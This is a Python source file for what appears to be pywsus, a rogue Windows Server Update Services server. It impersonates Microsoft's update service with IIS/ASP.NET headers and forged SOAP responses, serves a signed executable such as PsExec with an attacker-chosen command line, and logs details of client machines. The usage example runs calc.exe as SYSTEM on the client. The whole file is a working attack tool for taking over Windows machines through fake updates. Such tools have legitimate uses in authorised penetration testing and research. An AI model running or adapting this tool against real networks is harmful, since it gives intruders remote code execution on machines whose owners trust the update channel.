#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from bs4 import BeautifulSoup
from random import randint
import uuid
import html
import datetime
import base64
import hashlib
import logging
import sys
import os
import argparse


class WSUSUpdateHandler:
    def __init__(self, executable_file, executable_name, eula_file, client_address):
        self.get_config_xml = ''
        self.get_cookie_xml = ''
        self.register_computer_xml = ''
        self.sync_updates_xml = ''
        self.get_extended_update_info_xml = ''
        self.report_event_batch_xml = ''
        self.get_authorization_cookie_xml = ''

        self.revision_ids = [randint(900000, 999999), randint(900000, 999999)]
        self.deployment_ids = [randint(80000, 99999), randint(80000, 99999)]
        self.uuids = [uuid.uuid4(), uuid.uuid4()]

        self.executable = executable_file
        self.executable_name = executable_name
        self.sha1 = ''
        self.sha256 = ''

        self.eula = eula_file

        self.client_address = client_address

    def get_last_change(self):
        return (datetime.datetime.now() - datetime.timedelta(days=3)).isoformat()

    def get_cookie(self):
        return base64.b64encode(b'A'*47).decode('utf-8')

    def get_expire(self):
        return (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat()

    def set_resources_xml(self, command):
        # init resources

        path = os.path.abspath(os.path.dirname(__file__))

        try:
            with open('{}/resources/get-config.xml'.format(path), 'r') as file:
                self.get_config_xml = file.read().format(lastChange=self.get_last_change())
                file.close()

            with open('{}/resources/get-cookie.xml'.format(path), 'r') as file:
                self.get_cookie_xml = file.read().format(expire=self.get_expire(), cookie=self.get_cookie())
                file.close()

            with open('{}/resources/register-computer.xml'.format(path), 'r') as file:
                self.register_computer_xml = file.read()
                file.close()

            with open('{}/resources/sync-updates.xml'.format(path), 'r') as file:
                # TODO KB1234567 -> dynamic
                self.sync_updates_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                                                           deployment_id1=self.deployment_ids[0], deployment_id2=self.deployment_ids[1],
                                                           uuid1=self.uuids[0], uuid2=self.uuids[1], expire=self.get_expire(), cookie=self.get_cookie())
                file.close()

            with open('{}/resources/get-extended-update-info.xml'.format(path), 'r') as file:
                self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1], sha1=self.sha1, sha256=self.sha256,
                                                                       filename=self.executable_name, file_size=len(executable_file), command=html.escape(html.escape(command)),
                                                                       url='http://{host}/{path}/{executable}'.format(host=self.client_address, path=uuid.uuid4(), executable=self.executable_name))
                file.close()

            with open('{}/resources/report-event-batch.xml'.format(path), 'r') as file:
                self.report_event_batch_xml = file.read()
                file.close()

            with open('{}/resources/get-authorization-cookie.xml'.format(path), 'r') as file:
                self.get_authorization_cookie_xml = file.read().format(cookie=self.get_cookie())
                file.close()

        except Exception as err:
            logging.error('Error: {err}'.format(err=err))
            sys.exit(1)

    def set_filedigest(self):
        hash1 = hashlib.sha1()
        hash256 = hashlib.sha256()
        try:
            data = open(update_handler.executable, 'rb').read()
            hash1.update(data)
            hash256.update(data)
            self.sha1 = base64.b64encode(hash1.digest()).decode()
            self.sha256 = base64.b64encode(hash256.digest()).decode()

        except Exception as err:
            logging.error('Error in set_filedigest: {err}'.format(err=err))
            sys.exit(1)

    def __str__(self):
        return 'The update metadata - uuids: {uuids},revision_ids: {revision_ids}, deployment_ids: {deployment_ids}, executable: {executable}, sha1: {sha1}, sha256: {sha256}'.format(
            uuids=self.uuids, revision_ids=self.revision_ids, deployment_ids=self.deployment_ids, executable=self.executable_name, sha1=self.sha1, sha256=self.sha256)


class WSUSBaseServer(BaseHTTPRequestHandler):
    def _set_response_post(self):

        self.protocol_version = 'HTTP/1.1'
        self.send_response(200)
        self.server_version = 'Microsoft-IIS/10.0'
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'private')
        self.send_header('Content-Type', 'text/plain')
        self.send_header('X-AspNet-Version', '4.0.30319')
        self.send_header('X-Powered-By', 'ASP.NET')
        self.end_headers()

    def _set_response_eula(self, deliverFile = False):

        self.protocol_version = 'HTTP/1.1'
        if "Range" in self.headers:
            self.send_response(206)
        else:
            self.send_response(200)
        self.server_version = 'Microsoft-IIS/10.0'
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'private')
        self.send_header('Content-Type', 'text/plain')
        self.send_header("Content-Length", len(update_handler.eula))
        self.send_header('X-AspNet-Version', '4.0.30319')
        self.send_header('X-Powered-By', 'ASP.NET')
        self.end_headers()
        try:
            # Always read in binary mode. Opening files in text mode may cause
            # newline translations, making the actual size of the content
            # transmitted *less* than the content-length!
            f = open(update_handler.eula, 'rb')
            fs = os.fstat(f.fileno())
            size = int(fs[6])
            if deliverFile:
                start_range = 0
                end_range = size
                if "Range" in self.headers:
                    s, e = self.headers['range'][6:].split('-', 1)
                    sl = len(s)
                    el = len(e)
                    if sl > 0:
                        start_range = int(s)
                        if el > 0:
                            end_range = int(e) + 1
                    elif el > 0:
                        ei = int(e)
                        if ei < size:
                            start_range = size - ei
                    self.send_header("Content-Range", 'bytes ' + str(start_range) + '-' + str(end_range - 1) + '/' + str(size))
                    self.send_header("Content-Length", end_range - start_range)
                    f.seek(start_range, 0)
                    chunk = 0x1000
                    total = 0
                    while chunk > 0:
                        if start_range + chunk > end_range:
                            chunk = end_range - start_range
                        try:
                            self.wfile.write(f.read(chunk))
                        except:
                            break
                        total += chunk
                        start_range += chunk
                else:
                    self.wfile.write(f.read())
            else:
                self.send_header("Content-Length", len(f.read()))
                #self.wfile.write(update_handler.executable)
            f.close()
        except IOError:
            self.send_error(404, "File not found")
            return (None, 0, 0)
        

    def _set_response_executable(self, deliverFile = False):

        self.protocol_version = 'HTTP/1.1'
        if "Range" in self.headers:
            self.send_response(206)
        else:
            self.send_response(200)
        
        #self.send_header('Server', 'Microsoft-IIS/10.0')
        self.server_version = "Microsoft-IIS/10.0"
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'private')
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('X-AspNet-Version', '4.0.30319')
        self.send_header('X-Powered-By', 'ASP.NET')
        try:
            # Always read in binary mode. Opening files in text mode may cause
            # newline translations, making the actual size of the content
            # transmitted *less* than the content-length!
            f = open(update_handler.executable, 'rb')
            fs = os.fstat(f.fileno())
            size = int(fs[6])
            if deliverFile:
                start_range = 0
                end_range = size
                if "Range" in self.headers:
                    s, e = self.headers['range'][6:].split('-', 1)
                    sl = len(s)
                    el = len(e)
                    if sl > 0:
                        start_range = int(s)
                        if el > 0:
                            end_range = int(e) + 1
                    elif el > 0:
                        ei = int(e)
                        if ei < size:
                            start_range = size - ei
                    self.send_header("Content-Range", 'bytes ' + str(start_range) + '-' + str(end_range - 1) + '/' + str(size))
                    self.send_header("Content-Length", end_range - start_range)
                    self.end_headers()
                    f.seek(start_range, 0)
                    chunk = 0x1000
                    total = 0
                    while chunk > 0:
                        if start_range + chunk > end_range:
                            chunk = end_range - start_range
                        try:
                            self.wfile.write(f.read(chunk))
                        except:
                            break
                        total += chunk
                        start_range += chunk
                else:
                    self.end_headers()
                    self.wfile.write(f.read())
            else:
                self.send_header("Content-Length", len(f.read()))
                self.end_headers()
                #self.wfile.write(update_handler.executable)
            f.close()
        except IOError:
            self.send_error(404, "File not found")
            return (None, 0, 0)
              

    def do_HEAD(self):
        logging.debug('HEAD request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))

        if ".exe" in self.path:
            logging.info("EXE file requested via method 'HEAD'!")
            #logging.info("EXE file requested: {path}".format(path=self.path))
            self._set_response_executable(False)

        if ".txt" in self.path:
            logging.info("TXT file requested via method 'HEAD'!")
            #logging.info("TXT file requested: {path}".format(path=self.path))
            self._set_response_eula(False)


    def do_GET(self):
        logging.debug('GET request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))

        if ".exe" in self.path:
            logging.info("EXE file requested via method 'GET'!")
            #logging.info("EXE file requested: {path}".format(path=self.path))
            logging.info("Delivering payload executable in response ...")
            self._set_response_executable(True)
            
        if ".txt" in self.path:
            logging.info("TXT file requested via method 'GET'!")
            #logging.info("TXT file requested: {path}".format(path=self.path))
            logging.info("Delivering payload EULA file in response ...")
            self._set_response_eula(True)

    def do_POST(self):

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        post_data_xml = BeautifulSoup(post_data, "xml")
        data = None

        logging.debug("POST Request,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=post_data_xml.encode_contents()))

        soap_action = self.headers['SOAPAction']

        if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b
            data = BeautifulSoup(update_handler.get_config_xml, 'xml')

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/36a5d99a-a3ca-439d-bcc5-7325ff6b91e2
            data = BeautifulSoup(update_handler.get_cookie_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b0f2a41f-4b96-42a5-b84f-351396293033
            data = BeautifulSoup(update_handler.register_computer_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/6b654980-ae63-4b0d-9fae-2abb516af894
            data = BeautifulSoup(update_handler.sync_updates_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/862adc30-a9be-4ef7-954c-13934d8c1c77
            data = BeautifulSoup(update_handler.get_extended_update_info_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/da9f0561-1e57-4886-ad05-57696ec26a78
            data = BeautifulSoup(update_handler.report_event_batch_xml, "xml")

            post_data_report = BeautifulSoup(post_data, "xml")
            logging.info('Client Report: {targetID}, {computerBrand}, {computerModel}, {extendedData}.'.format(targetID=post_data_report.TargetID.text,
                                                                                                computerBrand=post_data_report.ComputerBrand.text,
                                                                                                computerModel=post_data_report.ComputerModel.text,
                                                                                                extendedData=post_data_report.ExtendedData.ReplacementStrings.string)) 

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744
            data = BeautifulSoup(update_handler.get_authorization_cookie_xml, "xml")

        else:
            logging.warning("SOAP Action not handled")
            logging.info('SOAP Action: {}'.format(soap_action))
            return

        self._set_response_post()
        self.wfile.write(data.encode_contents())

        logging.info('SOAP Action: {}'.format(soap_action))

        if data is not None:
            logging.debug("POST Response,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=data.encode_contents))
        else:
            logging.warning("POST Response without data.")


def run(host, port, server_class=HTTPServer, handler_class=WSUSBaseServer):
    server_address = (host, port)
    httpd = server_class(server_address, handler_class)

    logging.info('Starting httpd...\n')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    httpd.server_close()
    logging.info('Stopping httpd...\n')


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython3 pywsus.py -H X.X.X.X -p 8530 -b PsExec64.exe -e eula.txt -c "-accepteula -s calc.exe"')

    parser._optionals.title = "OPTIONS"
    parser.add_argument('-H', '--host', required=True, help='The listening adress.')
    parser.add_argument('-p', '--port', type=int, default=8530, help='The listening port.')
    parser.add_argument('-b', '--binary', type=str, required=True, help='The Microsoft signed executable returned to the client.')
    parser.add_argument('-e', '--eula', type=str, required=True, help='The EULA text file being distributed with the update.')
    parser.add_argument('-c', '--command', required=True, help='The parameters for the current executable.')
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Increase output verbosity.')

    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    executable_file = args.binary
    executable_name = os.path.basename(args.binary)

    eula_file = args.eula

    update_handler = WSUSUpdateHandler(executable_file, executable_name, eula_file, client_address='{host}:{port}'.format(host=args.host, port=args.port))

    update_handler.set_filedigest()
    update_handler.set_resources_xml(args.command)

    logging.info(update_handler)

    run(host=args.host, port=args.port)


